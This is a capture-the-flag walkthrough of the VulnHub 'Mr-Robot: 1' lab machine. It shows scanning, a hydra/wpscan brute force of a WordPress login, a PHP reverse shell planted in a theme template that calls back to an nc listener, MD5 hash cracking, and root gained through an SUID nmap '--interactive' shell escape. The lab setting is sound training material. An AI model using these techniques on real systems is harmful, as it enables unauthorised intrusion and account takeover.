#  Mr-Robot: 1

https://www.vulnhub.com/entry/mr-robot-1,151/

We netdiscover to find `192.168.1.101` and do a full nmap scan

```
root@kali:~# nmap -p- -T4 -A 192.168.1.101

Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-03 20:30 BST
Nmap scan report for linux.home (192.168.1.101)
Host is up (0.00024s latency).
Not shown: 65532 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
MAC Address: 00:0C:29:12:54:C7 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.8
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.24 ms linux.home (192.168.1.101)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 639.23 seconds
```

Nikto scan
```
root@kali:~# nikto -h http://192.168.1.101/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.101
+ Target Hostname:    192.168.1.101
+ Target Port:        80
+ Start Time:         2017-10-03 21:17:49 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.5.29
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x29 0x52467010ef8ad 
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
+ OSVDB-3092: /admin/: This might be interesting...
+ Uncommon header 'link' found, with contents: <http://192.168.1.101/?p=23>; rel=shortlink
+ /readme.html: This WordPress file reveals the installed version.
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /admin/index.html: Admin login page/section found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login/: Admin login page/section found.
+ /wordpress/: A Wordpress installation was found.
+ /wp-admin/wp-login.php: Wordpress login found
+ /blog/wp-login.php: Wordpress login found
+ /wp-login.php: Wordpress login found
+ 7535 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2017-10-03 21:23:56 (GMT1) (367 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### Flag 1 - robots.txt

There are 3 flags, we find our first one in robots.txt `https://192.168.1.101/key-1-of-3.txt` with flag `073403c8a58a1f80d943455fb30724b9`. So far so goood.

### Flag 2 - Wordpress Login

We check the second file and save it somewhere `https://192.168.1.101/fsocity.dic`. The file seems to be some sort of wordlist, which I imagine we will have to use hydra. There are also a lot of repeated words in there. `sort fsocity.dic | uniq > fsocietyless.dic`. We also see it is wordpress and can either try to find exploitable plugins or use our word list for some dictionary attack.

For the wordpress login, when we try to login  with elliot (the main character of Mr. Robot), it tells us the username is correct is wrong. If this is still insufficient, we can scrape the wikipedia article for names `cewl https://en.wikipedia.org/wiki/Mr._Robot -d 0 -w userlist` we can do `wpscan -u http://192.168.1.101 --wordlist /root/Downloads/fsocity.dic --username elliot` or `hydra -l elliot -P /usr/share/wordlists/rockyou.txt 192.168.1.101 http-form-post \
"/wp-login.php:log=^USER^&pwd=^PASS^:login_error"'`. I tested it with both, and wpscan and it is much faster.

```
root@kali:~# hydra -l elliot -P test/fsocietyless.dic 192.168.1.101 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&redirect_to=http%3A%2F%2F10.0.2.7%2Fwp-admin%2F&testcookie=1:login_error"
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-10-04 03:18:41
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:1/p:11452), ~716 tries per task
[DATA] attacking http-post-form://192.168.1.101:80//wp-login.php:log=^USER^&pwd=^PASS^&redirect_to=http%3A%2F%2F10.0.2.7%2Fwp-admin%2F&testcookie=1:login_error
[STATUS] 763.00 tries/min, 763 tries in 00:01h, 10689 to do in 00:15h, 16 active
[STATUS] 765.67 tries/min, 2297 tries in 00:03h, 9155 to do in 00:12h, 16 active
[STATUS] 764.57 tries/min, 5352 tries in 00:07h, 6100 to do in 00:08h, 16 active
[80][http-post-form] host: 192.168.1.101   login: elliot   password: ER28-0652
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2017-10-04 03:26:16


root@kali:~# wpscan --url 192.168.1.101 --wordlist ~/test/fsocietyless.dic --username elliot
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.9.3
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.1.101/
[+] Started: Wed Oct  4 03:27:44 2017

[+] robots.txt available under: 'http://192.168.1.101/robots.txt'
[!] The WordPress 'http://192.168.1.101/readme.html' file exists exposing a version number
[+] Interesting header: SERVER: Apache
[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
[+] Interesting header: X-MOD-PAGESPEED: 1.9.32.3-4523
[+] XML-RPC Interface available under: http://192.168.1.101/xmlrpc.php

[+] WordPress version 4.3.12 (Released on 2017-09-19) identified from advanced fingerprinting, rss generator, rdf generator, atom generator, links opml
[!] 1 vulnerability identified from the version number

[!] Title: WordPress 2.3-4.8.2 - Host Header Injection in Password Reset
    Reference: https://wpvulndb.com/vulnerabilities/8807
    Reference: https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
    Reference: http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
    Reference: https://core.trac.wordpress.org/ticket/25239
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295

[+] Enumerating plugins from passive detection ...
[+] No plugins found
[+] Starting the password brute forcer
  [+] [SUCCESS] Login : elliot Password : ER28-0652                                                                                     

  Brute Forcing 'elliot' Time: 00:01:32 <===========================                              > (5624 / 11452) 49.10%  ETA: 00:01:36
  +----+--------+------+-----------+
  | Id | Login  | Name | Password  |
  +----+--------+------+-----------+
  |    | elliot |      | ER28-0652 |
  +----+--------+------+-----------+

[+] Finished: Wed Oct  4 03:29:18 2017
[+] Requests Done: 5675
[+] Memory used: 26.492 MB
[+] Elapsed time: 00:01:33
```

Now, logging as elliot:ER28-0652 we can upload a php-reverse-shell.php from pentestmonkey and change the configuration to conncet to our attacker vm. We have several options here, do a searchsploit to find a vulnerable plugin, install it and exploit it. Or we can change the Appearance -> Editor -> 404.Template as our php reverse shell. We `nc -lvp 1234` and visit http://192.168.182.158/404.php.

```
root@kali:~# nc -lvp 1234
listening on [any] 1234 ...
connect to [192.168.1.88] from linux.home [192.168.1.101] 55905
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 02:36:26 up  3:37,  0 users,  load average: 0.00, 0.51, 1.68
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/$ ls
ls
bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
daemon@linux:/$ find / -name "key-2-of-3.txt" 2>&-
find / -name "key-2-of-3.txt" 2>&-
daemon@linux:/$ cat /home/robot/key-2-of-3.txt
cat /home/robot/key-2-of-3.txt
cat: /home/robot/key-2-of-3.txt: Permission denied
daemon@linux:/$ cd /home/robot    
cd /home/robot
daemon@linux:/home/robot$ ls
ls
key-2-of-3.txt	password.raw-md5
daemon@linux:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
daemon@linux:/home/robot$ ls -lah
ls -lah
total 16K
drwxr-xr-x 2 root  root  4.0K Nov 13  2015 .
drwxr-xr-x 3 root  root  4.0K Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

We have the robot login, we can just use a md5 reverse lookup online `robot:abcdefghijklmnopqrstuvwxyz` and cat the file to find flag 2: `822c73956184f694993bede3eb39f959`

```
daemon@linux:/home/robot$ su robot                               
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$ cat /home/robot/key-2-of-3.txt
cat /home/robot/key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

### Flag 3 

Our last flag is probably some privilege escalation. We can try to find exploits through `uname -a` (e.g. dirty cow works) or try to run a file containing an SUID bit with root permissions, then spawn a shell from that.

```
robot@linux:~$ find / -perm +6000 -type f -exec ls -ld {} \; 2>&1 | grep -v "Permission denied"
< +6000 -type f -exec ls -ld {} \; 2>&1 | grep -v "Permission denied"        
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 69120 Feb 12  2015 /bin/umount
-rwsr-xr-x 1 root root 94792 Feb 12  2015 /bin/mount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 36936 Feb 17  2014 /bin/su
-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-touchlock
-rwsr-xr-x 1 root root 47032 Feb 17  2014 /usr/bin/passwd
-rwsr-xr-x 1 root root 32464 Feb 17  2014 /usr/bin/newgrp
-rwxr-sr-x 1 root utmp 421768 Nov  7  2013 /usr/bin/screen
-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-unlock
-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-lock
-rwsr-xr-x 1 root root 41336 Feb 17  2014 /usr/bin/chsh
-rwxr-sr-x 1 root crontab 35984 Feb  9  2013 /usr/bin/crontab
-rwsr-xr-x 1 root root 46424 Feb 17  2014 /usr/bin/chfn
-rwxr-sr-x 1 root shadow 54968 Feb 17  2014 /usr/bin/chage
-rwsr-xr-x 1 root root 68152 Feb 17  2014 /usr/bin/gpasswd
-rwxr-sr-x 1 root shadow 23360 Feb 17  2014 /usr/bin/expiry
-rwxr-sr-x 1 root mail 14856 Dec  7  2013 /usr/bin/dotlockfile
-rwsr-xr-x 1 root root 155008 Mar 12  2015 /usr/bin/sudo
-rwxr-sr-x 1 root ssh 284784 May 12  2014 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 19024 Feb 12  2015 /usr/bin/wall
-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap      <------------ nmap? looks interesting
-rwsr-xr-x 1 root root 440416 May 12  2014 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
-r-sr-xr-x 1 root root 9532 Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root 14320 Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 10344 Feb 25  2015 /usr/lib/pt_chown
-rwxr-sr-x 1 root shadow 35536 Jan 31  2014 /sbin/unix_chkpwd
find: `/proc/2950/task/2950/fd/8': No such file or directory
find: `/proc/2950/task/2950/fdinfo/8': No such file or directory
find: `/proc/2950/fd/8': No such file or directory
find: `/proc/2950/fdinfo/8': No such file or directory

robot@linux:~$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !whoami
!whoami
root
waiting to reap child : No child processes
nmap> !sh
!sh
# whoami
whoami
root
# ls /root    
ls /root
firstboot_done	key-3-of-3.txt
# cat /root/key-3-of-3.txt
cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

Exploiting the nmap --interactive, we can escape to a shell and get our flag 3: `04787ddef27c3dee1ee161b21670b4e4`
